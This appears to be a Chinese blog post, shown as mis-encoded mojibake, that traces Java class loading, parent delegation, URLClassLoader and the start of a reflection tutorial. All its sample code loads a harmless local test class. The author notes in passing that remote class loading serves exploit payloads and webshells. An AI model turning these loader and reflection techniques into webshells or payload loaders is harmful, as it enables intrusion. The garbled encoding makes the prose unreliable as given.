è½½æŒ‡å®šçš„Javaç±»\nfindClassï¼šæŸ¥æ‰¾æŒ‡å®šçš„Javaç±»\nfindLoadedClassï¼šæŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»\ndefineClassï¼šå®šä¹‰ä¸€ä¸ªJavaç±»\nresolveClassï¼šé“¾æ¥æŒ‡å®šçš„Javaç±»\nç±»åŠ è½½çš„æ–¹å¼ å‘½ä»¤è¡Œå¯åŠ¨åº”ç”¨æ—¶ç”±JVMåˆå§‹åŒ–åŠ è½½ é€šè¿‡Class.forName()æ–¹æ³•åŠ¨æ€åŠ è½½ é€šè¿‡ClassLoader.loadClass()æ–¹æ³•åŠ¨æ€åŠ è½½ã€‚ é€šè¿‡Class.forNameæ–¹æ³•åŠ¨æ€åŠ è½½ä¼šæ‰§è¡Œç±»ä¸­çš„staticå—ï¼Œè€ŒClassLoader.loadClass()æ–¹æ³•åŠ¨æ€åŠ è½½ä¸ä¼šæ‰§è¡Œ\nåœ¨å‰é¢åå°„çš„å­¦ä¹ ä¸­ä¹Ÿæ˜¯è¯´æ˜äº†å¯ä»¥åˆ©ç”¨classloaderæ¥åŠ è½½ç±»ï¼Œåœ¨è¿™é‡Œåˆ©ç”¨åŠ è½½å™¨è·å–Classå¯¹è±¡çš„ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package java_foundation; import java.lang.ClassLoader; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ //åŠ è½½ç±»çš„Classå¯¹è±¡ï¼š Class clazz = ClassLoader.getSystemClassLoader().loadClass(\u0026#34;java_foundation.Reflection\u0026#34;); Method method = clazz.getDeclaredMethod(\u0026#34;getName\u0026#34;); System.out.println(\u0026#34;hello \u0026#34;+method.invoke(clazz.newInstance(),null)); } } //hello fupanc å¯ä»¥çœ‹åˆ°å¯ä»¥æ­£å¸¸è·å–åˆ°ç±»çš„Classå¯¹è±¡å¹¶ä¸”è°ƒç”¨å®ƒã€‚\nè°ƒè¯•ç±»åŠ è½½è¿‡ç¨‹ æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 package java_foundation; import java.lang.ClassLoader; public class Main { public static void main(String[] args) throws Exception{ ClassLoader classLoader = ClassLoader.getSystemClassLoader(); //åŠ è½½ç±» Class clazz = classLoader.loadClass(\u0026#34;java_foundation.Reflection\u0026#34;); } } æ‰“æ–­ç‚¹åè°ƒè¯•ï¼š\nå¾—åˆ°å½“å‰ç±»åŠ è½½å™¨ä¸ºç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œç„¶åå¼ºåˆ¶æ­¥å…¥loadClass()æ–¹æ³•ï¼Œè¿›å…¥åˆ°äº†ClassLoaderç±»çš„loadClass()æ–¹æ³•ã€‚åœ¨è¿™ä¸ªlaodClass()æ–¹æ³•ä¸­ä¼šè°ƒç”¨å¦å¤–ä¸€ä¸ªé‡è½½çš„loadClass()æ–¹æ³•ï¼š\nç®€å•æ³¨æ„ä¸€ä¸‹è¿™ä¸ªå‚æ•°ä¼ é€’ï¼Œçœ‹çœ‹åé¢æœ‰æ²¡æœ‰ç”¨ã€‚ç»§ç»­è·Ÿè¿›è¿™ä¸ªloadClass()æ–¹æ³•,ä½†æ˜¯ç”±äºjdkè‡ªå¸¦çš„åŒ…ä¸­æœ‰äº›æ–‡ä»¶æ˜¯åç¼–è¯‘çš„.classæ–‡ä»¶ï¼Œåç¼–è¯‘çš„ä»£ç æœ‰ä¸€äº›ä¸æ˜¯å¾ˆçº¯å´ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å°†å…¶è½¬æ¢ä¸º.javaæ–‡ä»¶ï¼Œå…·ä½“å°±çœ‹å‚è€ƒæ–‡ç« ï¼Œè¿™é‡Œä¸å¤šè¯´ã€‚\nç„¶åç»§ç»­è°ƒè¯•ï¼Œæ­¥å…¥åå‘ç°åˆ°è¾¾äº†Launcherç±»çš„loadClass()æ–¹æ³•ï¼š\nè¿™æ ·å°±å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œçš„è°ƒç”¨é€»è¾‘ï¼Œä¸å¤šè¯´ï¼Œå†å¾€åé¢çœ‹ï¼Œè¿™é‡Œçš„ucp.knownToNotExist(name)ä¸ºfalseï¼Œæ‰€ä»¥ä¼šç›´æ¥è°ƒç”¨åˆ°åé¢çš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š\nè¿™é‡Œçš„superæ˜¯ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œè°ƒç”¨äº†ç±»åŠ è½½å™¨æ¥åŠ è½½ç±»ï¼š\nç°åœ¨å°±åˆ°äº†ClassLoaderç±»çš„loadClass()æ–¹æ³•ï¼š è¿™é‡Œçš„é€»è¾‘è¿˜æ˜¯æ¯”è¾ƒå¥½çœ‹ï¼Œé¦–å…ˆè¿™é‡Œçš„synchronizedæ˜¯Javaæä¾›çš„åŒæ­¥æœºåˆ¶ï¼Œç”¨äºä¿è¯å¤šçº¿ç¨‹è®¿é—®å…±äº«èµ„æºæ—¶çš„çº¿ç¨‹å®‰å…¨ï¼Œè€Œåœ¨getClassLoadingLock(name) æ–¹æ³•è¿”å›ä¸€ä¸ªç”¨äºåŠ è½½ç±»çš„é”å¯¹è±¡ï¼Œæ‰€ä»¥è¿™çš„ç›®çš„å°±æ˜¯ä¸ºæ¯ä¸ªç±»çš„åŠ è½½è¿‡ç¨‹æä¾›ç‹¬ç«‹çš„é”ï¼Œé˜²æ­¢å¤šä¸ªçº¿ç¨‹åŒæ—¶åŠ è½½åŒä¸€ä¸ªç±»ã€‚\nç„¶åç°åœ¨æ¥çœ‹æ–¹æ³•å†…éƒ¨çš„ä»£ç ï¼Œé¦–å…ˆå°±æ˜¯çœ‹JVMä¸­æ˜¯å¦åŠ è½½è¿‡è¿™ä¸ªç±»ï¼Œè¿™é‡Œä¸ºnullï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰åŠ è½½è¿‡ã€‚ç„¶åè¿›å…¥äº†ifè¯­å¥ï¼š\nè¿™é‡Œæ£€æµ‹åˆ°äº†ç³»ç»Ÿç±»åŠ è½½å™¨æœ‰çˆ¶åŠ è½½å™¨Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰ã€‚\nç„¶åå°±è°ƒç”¨ç±»ExtClassLoaderç±»åŠ è½½å™¨çš„loadClass()æ–¹æ³•ï¼ˆåŒæ ·æ˜¯ClassLoaderç±»çš„loadClass()æ–¹æ³•ï¼‰ï¼š\nä½†æ˜¯è¿™é‡Œçš„parentä¸ºnullï¼Œä¹Ÿç®—ç¬¦åˆé¢„æœŸï¼Œå› ä¸ºæ‰©å±•ç±»åŠ è½½å™¨æœ¬æ¥å°±æ²¡æœ‰çˆ¶åŠ è½½å™¨ã€‚\nç„¶åå°±ä¼šè¿›å…¥elseè¯­å¥ï¼Œå…¶å®è¿™ä¸ªfindBootstrapClassOrNull()æ–¹æ³•å°±æ˜¯çœ‹æ€ä¹ˆè¿›è¡Œçš„ï¼Œè·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼š\nä½†æ˜¯è¿™ä¸ªfindBootstrapClass(name)æ‰§è¡Œåè¿˜æ˜¯ä¸ºNullï¼Œå›é€€åˆ°loadClass()æ–¹æ³•ï¼š\nåé¢å°±ä¼šè¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼Œç„¶åè°ƒç”¨æ‰©å±•ç±»åŠ è½½å™¨æ¥è°ƒç”¨findClass()æ–¹æ³•æ¥æŸ¥æ‰¾ç±»ï¼š\nå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•ä¸­æœ‰defineClass()æ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰è¿›å…¥è¿™ä¸ªæ¡ä»¶ï¼Œå¤§æ¦‚å¯ä»¥çŸ¥é“è¿™é‡Œå°±æ˜¯åœ¨è°ƒç”¨æ‰©å±•ç±»åŠ è½½å™¨æ¥æŸ¥æ‰¾ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ‰¾åˆ°ï¼Œç›´æ¥é€€å‡ºäº†ã€‚\nç„¶åå°±é€€å‡ºåˆ°äº†å‰é¢AppClassLoaderåŠ è½½å™¨çš„loadClass()æ–¹æ³•ï¼š\néšåå°±ä¼šè°ƒç”¨åˆ°AppClassLoaderç±»åŠ è½½å™¨çš„findClass()æ–¹æ³•ï¼š\nè¿™é‡Œåº”è¯¥æ˜¯å› ä¸ºå¼‚å¸¸é€€å‡ºå¯¼è‡´cç›´æ¥è¢«è®¾ç½®ä¸ºnullã€‚\nç„¶åè·Ÿè¿›è¿™é‡Œçš„findClass()æ–¹æ³•:\nå¯ä»¥çœ‹åˆ°æœ€åè¿”å›è¿™ä¸ªresultï¼Œè¿™ä¸ªresultå°±æ˜¯æˆ‘ä»¬æƒ³è¦å¯»æ‰¾çš„ç±»ã€‚å¹¶ä¸”è¿™é‡Œæ˜¯åœ¨è¿™ä¸ªæ–¹æ³•å†…éƒ¨å£°æ˜çš„resultï¼Œæ‰€ä»¥è¿™ä¸ªæ‰¾ç±»çš„æ“ä½œå¿…ç„¶æ˜¯ä¸­é—´çš„é‚£ä¸ªèµ‹å€¼æ“ä½œå®Œæˆçš„ï¼Œè°ƒè¯•ä¸€ä¸‹ï¼Œç¡®å®æ˜¯è°ƒç”¨çš„defineClass()æ–¹æ³•æ¥å®šä¹‰çš„ç±»ï¼š\næœ€åæ˜¯æ‰¾åˆ°äº†è¿™ä¸ªäº†ç±»:\nç„¶åå›åˆ°loadClass()æ–¹æ³•ï¼Œæœ€åæ˜¯ç›´æ¥è¿”å›äº†è¿™ä¸ªReflectionç±»ï¼š\nç„¶åä¸€ç›´è¿”å›ï¼ŒæˆåŠŸå¾—åˆ°äº†è¿™ä¸ªRefelctionç±»çš„Classå¯¹è±¡ï¼š\nOKã€‚è°ƒè¯•ç»“æŸã€‚å¤§æ¦‚è¿‡ç¨‹æ¢³ç†ä¸‹æ¥ç¡®å®æ¯”è¾ƒç¬¦åˆåŒäº²å§”æ´¾æœºåˆ¶ï¼Œå…ˆæ˜¯AppClassLoaderï¼Œç„¶åæ˜¯ExtClassLoaderï¼Œç„¶åæ˜¯å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œå¯åŠ¨ç±»åŠ è½½å™¨æ‰¾ä¸åˆ°ç„¶åå†å§”æ´¾ç»™å­åŠ è½½å™¨åŠ è½½ï¼Œæœ€ååœ¨ç³»ç»Ÿç±»åŠ è½½å™¨æ‰¾åˆ°æƒ³è¦åŠ è½½çš„ç±»ã€‚\nâ€”â€”â€”â€”\nç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹sun.misc.Launcherç±»ï¼Œå¹¶ä¸”åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­éƒ½æ˜¯è¿›å…¥äº†è¿™ä¸ªLauncherç±»çš„ï¼Œç®€å•çœ‹ä¸€ä¸‹æºç ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªç±»é‡Œé¢æœ‰å¸¸ç”¨çš„ç±»åŠ è½½å™¨çš„æºç ï¼Œçœ‹ä¸‹é¢è¿™ä¸¤ä¸ªä»£ç ï¼š\n1 2 3 static class AppClassLoader extends URLClassLoader{} static class ExtClassLoader extends URLClassLoader{} çœ‹ä¸€ä¸‹URLClassLoader\n1 public class URLClassLoader extends SecureClassLoader implements Closeable{} SecureClassLoader\n1 public class SecureClassLoader extends ClassLoader{} ä»è¿™äº›ä»£ç ç‰‡æ®µå¯ä»¥çœ‹å‡ºä¸Šé¢ä»‹ç»çš„ç±»åŠ è½½å™¨åœ¨ä½¿ç”¨æ—¶ä¸ºä»€ä¹ˆä¸æ˜¯ç»§æ‰¿å…³ç³»ï¼Œè€Œæ˜¯ç»„åˆå…³ç³»ï¼Œå«ä½œçˆ¶åŠ è½½å™¨æ˜¯ä¸ºäº†æ›´å¥½å­¦ä¹ ã€‚\nç»§æ‰¿å›¾å¦‚ä¸‹ï¼š\nURLClassLoader URLClassLoader ç»§æ‰¿äº† ClassLoaderï¼Œä»åå­—å°±å¯ä»¥çœ‹å‡ºæ¥ï¼ŒURLClassLoader æä¾›äº†åŠ è½½è¿œç¨‹èµ„æºçš„èƒ½åŠ›ï¼Œåœ¨å†™æ¼æ´åˆ©ç”¨çš„ payload æˆ–è€… webshell çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§æ¥åŠ è½½è¿œç¨‹çš„ jar æ¥å®ç°è¿œç¨‹çš„ç±»æ–¹æ³•è°ƒç”¨ã€‚\né¦–å…ˆå£°æ˜ä¸€ç‚¹ï¼Œå¯¹äºclassæ–‡ä»¶æ˜¯å¦è¦æœ‰è½¯ä»¶åŒ…å£°æ˜é—®é¢˜ï¼ŒæŠ¥é”™çš„è¯æœ‰ä¸¤ç§è§£å†³æ–¹æ³•ï¼š\nclassæ–‡ä»¶ä¸è¦è½¯ä»¶åŒ… è°ƒç”¨loadClass()æ–¹æ³•åŠ è½½æ—¶åŠ ä¸Šè½¯ä»¶åŒ…å³å¯ï¼Œå¦‚ java_foundation.Reflection â€”â€”â€”â€”â€”â€”\nMyTest.javaï¼š\n1 2 3 4 5 public class MyTest { public MyTest(){ System.out.println(\u0026#34;è°ƒç”¨äº†æ— å‚æ„é€ å‡½æ•°\u0026#34;); } } javacç¼–è¯‘ç”ŸæˆMyTest.classæ–‡ä»¶ï¼Œå†å°†å…¶æ”¾åœ¨Eç›˜ã€‚ç„¶åå°†å½“å‰é¡¹ç›®ä¸­çš„æ‰€æœ‰MyTest.javaæ–‡ä»¶åˆ é™¤ï¼ŒåŒæ—¶æ³¨æ„classpathä¸­å·²ç¼–è¯‘çš„MyTest.classæ–‡ä»¶ï¼Œä¹Ÿè¦åˆ é™¤ï¼Œç„¶åä½¿ç”¨å¦‚ä¸‹ä»£ç æµ‹è¯•ï¼š\nMain.javaæ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ File filePath = new File(\u0026#34;E:\\\\\u0026#34;); URL url = filePath.toURI().toURL(); System.out.println(filePath.toURI()); System.out.println(filePath.toURI().toURL()); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url}); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTestç±»åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } è¾“å‡ºç»“æœï¼š\n1 2 3 4 5 file:/E:/ file:/E:/ MyTestç±»åŠ è½½å™¨ä¸ºjava.net.URLClassLoader@7a81197d MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸ºsun.misc.Launcher$AppClassLoader@14dad5dc è°ƒç”¨äº†æ— å‚æ„é€ å‡½æ•° å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨çš„æ˜¯URLClassLoaderæ„é€ å™¨ï¼Œå¹¶ä¸”è¿™ä¸ªæ„é€ å™¨çš„çˆ¶åŠ è½½å™¨æ˜¯AppClassLoaderåŠ è½½å™¨ã€‚äº†å¤§æ¦‚è¯´ä¸€ä¸‹è¿™é‡Œçš„é€»è¾‘ï¼Œå…ˆç”¨Fileç±»æ¥å®šä¹‰äº†ä¸€ä¸ªåœ¨Dç›˜ä¸‹æœç´¢æ–‡ä»¶çš„Fileå¯¹è±¡ã€‚\nç„¶åè°ƒç”¨äº†toURI().toURL()å‡½æ•°æ¥å°†Fileå¯¹è±¡è½¬æ¢ä¸ºURLï¼Œå› ä¸ºURLæ˜¯URLClassLoaderç”¨æ¥å®šä½èµ„æºçš„æ ¼å¼ã€‚è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªURLç±»å‹çš„æ•°ç»„ï¼Œæ˜¯URLClassLoaderç±»çš„æ„é€ å‡½æ•°å†³å®šçš„ï¼š\nç„¶åå°±æ˜¯åŠ è½½ç±»é‚£äº›äº†ï¼Œä¸å¤šè¯´ã€‚\nä½†æ˜¯å¦‚æœclasspathä¸­æœ‰ç›¸å…³è¿œç¨‹åŠ è½½ç±»çš„ç¼–è¯‘ä»£ç ï¼Œæ­¤æ—¶AppClassLoaderå°±ä¼šä¼˜å…ˆåŠ è½½è¿™ä¸ªæœ¬åœ°classæ–‡ä»¶ï¼Œè€Œä¸ä¼šå»åŠ è½½Eç›˜çš„æ–‡ä»¶ï¼Œå¦‚ä¸‹å°è¯•;\nå¦å¤–çš„MyTest.javaæ–‡ä»¶å†…å®¹ï¼š\n1 2 3 4 5 public class MyTest { public MyTest(){ System.out.println(\u0026#34;è°ƒç”¨äº†classPathä¸­çš„MyTestæ–‡ä»¶\u0026#34;); } } ç„¶åæˆ‘å°†å…¶æ‰“æˆjaråŒ…åŠ å…¥åˆ°å½“å‰mavené¡¹ç›®çš„å¤–éƒ¨åº“ä¸­ï¼Œä¹Ÿå°±æ˜¯å¼•å…¥äº†classpathä¸­ï¼Œå†ä½¿ç”¨ä¹‹å‰çš„ä»£ç é‡Œæ¥æµ‹è¯•ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š\n1 2 3 4 5 file:/E:/ file:/E:/ MyTestç±»åŠ è½½å™¨ä¸ºsun.misc.Launcher$AppClassLoader@14dad5dc MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸ºsun.misc.Launcher$ExtClassLoader@2f92e0f4 è°ƒç”¨äº†classPathä¸­çš„MyTestæ–‡ä»¶ å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯ä¼˜å…ˆè°ƒç”¨çš„classpathä¸­çš„æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸å†è°ƒç”¨URLä¸­å¼•å…¥çš„æ–‡ä»¶ã€‚\nä½†æ˜¯è¿™é‡ŒåŒæ ·æ˜¯æœ‰è§£å†³æ–¹æ³•çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°†URLClassLoaderçš„çˆ¶ç±»è®¾ç½®ä¸ºå¯åŠ¨ç±»åŠ è½½å™¨ï¼Œè¿™æ ·åœ¨åŒäº²å§”æ´¾æ—¶å°±å¯ä»¥é¿å…AppClassLoaderåŠ è½½classpathä¸­çš„æ–‡ä»¶ï¼Œè€Œæ˜¯URLClassLoaderä¼˜å…ˆåŠ è½½ã€‚\næµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ File filePath = new File(\u0026#34;E:\\\\\u0026#34;); URL url = filePath.toURI().toURL(); System.out.println(filePath.toURI()); System.out.println(filePath.toURI().toURL()); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url},null); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTestç±»åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } æ‰§è¡Œç»“æœä¸ºï¼š\n1 2 3 4 5 file:/E:/ file:/E:/ MyTestç±»åŠ è½½å™¨ä¸ºjava.net.URLClassLoader@24d46ca6 MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸ºnull è°ƒç”¨äº†æ— å‚æ„é€ å‡½æ•° å¯ä»¥çœ‹åˆ°è¿™é‡ŒæˆåŠŸå¤–éƒ¨åŠ è½½äº†å…¶ä»–çš„classæ–‡ä»¶ã€‚è¿™é‡Œè°ƒç”¨çš„æ„é€ å‡½æ•°ä¸ºï¼š\nå¯ä»¥çœ‹å‡ºæ¥ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯æŒ‡å®šçˆ¶ç±»çš„æ“ä½œï¼Œåœ¨å‰é¢çš„å­¦ä¹ åï¼Œè¿™é‡Œå°†å…¶è®¾ç½®ä¸ºnullå°±æ˜¯å°†å…¶è®¾ç½®ä¸ºå¯åŠ¨ç±»åŠ è½½å™¨çš„å­åŠ è½½å™¨ï¼Œå¾ˆå¥½ç†è§£ï¼Œç„¶åä¸ªäººç†è§£è¿™é‡Œè°ƒç”¨URLClassLoaderå°±æ˜¯ç”¨æ¥â€œåŠ¨æ€æ„é€ â€ä¸€ä¸ªClassLoaderï¼Œå¤§æ¦‚å°±æ˜¯è¿™æ ·ã€‚\nåŒæ ·çš„ï¼Œè¿˜å¯ä»¥ç›´æ¥å°†å…¶è®¾ç½®ä¸ºä¸€ä¸ªURLå¯¹è±¡ï¼Œå¦‚ä¸‹ä»£ç ï¼š\nMain.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ URL url = new URL(\u0026#34;file:/E:/\u0026#34;); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url},null); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTestç±»åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } è¾“å‡ºç»“æœä¸ºï¼š\n1 2 3 MyTestç±»åŠ è½½å™¨ä¸ºjava.net.URLClassLoader@24d46ca6 MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸ºnull è°ƒç”¨äº†æ— å‚æ„é€ å‡½æ•° æœ¬åœ°åŠ è½½æˆåŠŸï¼Œç½‘ç»œä¼ è¾“classæ–‡ä»¶æ˜¯å·®ä¸å¤šçš„ï¼Œåœ¨è¿™é‡Œå¯¹äºä¼ å‚ç±»å‹çœ‹æºç å¾ˆå®¹æ˜“çœ‹å‡ºæ¥ï¼Œè¿™é‡Œä¸å¤šè¯´ã€‚\nä½†æ˜¯æœ‰ä¸€ä¸ªç‚¹æ˜¯è¦è¯´æ˜çš„ï¼Œå¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ URL url = new URL(\u0026#34;file:/D:/\u0026#34;); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url},null); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTestç±»åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } æ²¡æœ‰è¾“å‡ºï¼Œè€Œæ˜¯æŠ¥é”™ï¼š\n1 2 3 4 5 Exception in thread \u0026#34;main\u0026#34; java.lang.ClassNotFoundException: MyTest at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java_foundation.Main.main(Main.java:11) æƒ³äº†ä¸€ä¸‹ï¼Œè¿™æ˜¯å› ä¸ºâ€æ–°å®šä¹‰â€œçš„URLClassLoaderåªæ˜¯å¯åŠ¨ç±»çš„å­åŠ è½½å™¨ï¼Œä½†æ˜¯å®ƒæ²¡æœ‰å­åŠ è½½å™¨ï¼Œè¿™é‡ŒDç›˜ä¸‹å¹¶æ²¡æœ‰MyTest.classæ–‡ä»¶ï¼Œè™½ç„¶classpathä¸­æœ‰ï¼Œä½†æ˜¯æ²¡æœ‰å­ç±»ï¼Œæ‰€ä»¥æ˜¯æ— æ³•è°ƒç”¨æˆåŠŸçš„ï¼Œå¯ä»¥å’Œå‰é¢çˆ¶ç±»çš„AppclassLoaderçš„ä»£ç å¯¹æ¯”ç†è§£ä¸€ä¸‹ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/t/12669?time__1311=GqGxuDRiD%3Dit%3DGN4eeqBKqAKKhQQdFD9WoD\nhttps://blog.csdn.net/yrk0556/article/details/105348968\nhttps://blog.csdn.net/qq_37205350/article/details/108805628\nhttps://blog.csdn.net/briblue/article/details/54973413\nhttps://blog.csdn.net/TJtulong/article/details/89598598\nhttps://blog.csdn.net/m0_45406092/article/details/108984101\nhttps://nivi4.notion.site/Java-cedccc0611654bd99f841de3ef578e24\n","date":"2025-01-22T12:54:28+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/","title":"Javaç±»åŠ è½½æœºåˆ¶"},{"content":"Javaåå°„æœºåˆ¶ Javaåå°„ï¼ˆReflectionï¼‰æ˜¯Javaéå¸¸é‡è¦çš„åŠ¨æ€ç‰¹æ€§**ï¼Œé€šè¿‡ä½¿ç”¨åå°„æˆ‘ä»¬å¯ä»¥è·å–åˆ°ä»»ä½•ç±»çš„æˆå‘˜æ–¹æ³•ï¼ˆMethodsï¼‰ã€æˆå‘˜å˜é‡ï¼ˆFieldsï¼‰ã€æ„é€ æ–¹æ³•ï¼ˆConstructorsï¼‰ç­‰ä¿¡æ¯ï¼Œè¿˜å¯ä»¥åŠ¨æ€åˆ›å»ºJavaå®ä¾‹ã€è°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³•ã€ä¿®æ”¹ä»»æ„çš„ç±»æˆå‘˜å˜é‡å€¼ç­‰**ã€‚\nè¿™æ˜¯ä¸€ä¸ªé‡è¦çš„æœºåˆ¶ï¼Œå¯ä»¥ç»•è¿‡javaç§æœ‰è®¿é—®æƒé™æ£€æŸ¥ï¼Œåå°„è·å–å¹¶è°ƒç”¨ç§æœ‰çš„ç±»ä»è€Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\næœ¬åœ°JDKæµ‹è¯•ç‰ˆæœ¬ï¼š\nJDK 8u71 æœ€å¥½æ˜¯æ­å»ºä¸€ä¸ªmavené¡¹ç›®æ¥å­¦ä¹ ï¼Œè¿™æ ·æ›´å¥½æ·»åŠ ä¾èµ–ã€‚\nåå°„æœºåˆ¶æµç¨‹ å½“æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç±»æ–‡ä»¶ï¼Œç»è¿‡javacç¼–è¯‘ä¹‹åï¼Œå°±ä¼šå½¢æˆ.classæ–‡ä»¶ï¼ŒåŒæ—¶JVMå†…å­˜ä¼šæŸ¥æ‰¾ç”Ÿæˆçš„.classæ–‡ä»¶è¯»å…¥å†…å­˜å’Œç»è¿‡ClassLoaderåŠ è½½ï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨åˆ›å»ºç”Ÿæˆä¸€ä¸ªClasså¯¹è±¡ï¼Œé‡Œé¢æ‹¥æœ‰å…¶è·å–çš„æˆå‘˜å˜é‡ï¼Œæˆå‘˜æ–¹æ³•ï¼Œå’Œæ„é€ æ–¹æ³•ç­‰ã€‚\nJVMä¸ºæ¯ä¸ªåŠ è½½çš„classåˆ›å»ºäº†å¯¹åº”çš„Classå®ä¾‹ï¼Œå¹¶åœ¨å®ä¾‹ä¸­ä¿å­˜äº†è¯¥classçš„æ‰€æœ‰ä¿¡æ¯ã€‚è·å–äº†æŸä¸ªClasså®ä¾‹ï¼Œå°±å¯ä»¥é€šè¿‡è¿™ä¸ªClasså®ä¾‹è·å–åˆ°è¯¥å®ä¾‹å¯¹åº”çš„classçš„æ‰€æœ‰ä¿¡æ¯\nåå°„å¸¸ç”¨çš„åŒ…å’Œç±» åå°„æœºåˆ¶ç›¸å…³æ“ä½œä¸€èˆ¬ä½äº java.lang.reflect åŒ…ä¸­\néœ€è¦æ³¨æ„çš„ç±»ï¼š\n1 2 3 4 java.lang.Classï¼šç±»å¯¹è±¡ java.lang.reflect.Constructorï¼šç±»çš„æ„é€ å™¨å¯¹è±¡ java.lang.reflect.Fieldï¼šç±»çš„å±æ€§å¯¹è±¡ java.lang.reflect.Methodï¼šç±»çš„æ–¹æ³•å¯¹è±¡ åå°„å¸¸è§ä½¿ç”¨çš„æ–¹æ³• è·å–ç±»çš„æ–¹æ³•ï¼šforName\nå®ä¾‹åŒ–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼šnewInstance\nè·å–å‡½æ•°çš„æ–¹æ³•ï¼šgetMethod\næ‰§è¡Œå‡½æ•°çš„æ–¹æ³•ï¼šinvoke\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™äº›æ–¹æ³•æ¥è·å¾—å…¶ä»–ç±»çš„å„ç§å±æ€§å’Œæ–¹æ³•\nè·å–classå¯¹è±¡ forNameä¸æ˜¯è·å–â€œç±»â€çš„å”¯ä¸€é€”å¾„ï¼Œé€šå¸¸æ¥è¯´è¿˜æœ‰ä¸‹é¢ä¸‰ç§åˆ©ç”¨java.lang.Classå¯¹è±¡çš„æ–¹å¼æ¥è·å–ä¸€ä¸ªâ€œç±»â€\nè·å–Classå¯¹è±¡çš„ä¸‰ç§æ–¹å¼ï¼š\nClass.forName(\u0026ldquo;å…¨ç±»å\u0026rdquo;) 